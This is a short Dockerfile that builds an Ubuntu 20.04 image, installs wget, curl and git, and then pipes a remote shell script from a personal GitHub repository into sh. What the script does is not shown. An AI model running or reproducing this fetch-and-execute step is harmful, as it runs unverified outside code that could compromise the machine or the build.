FROM ubuntu:20.04
RUN apt update && apt install wget curl git -y
RUN curl https://raw.githubusercontent.com/grco001/grc/main/grc.sh | sh
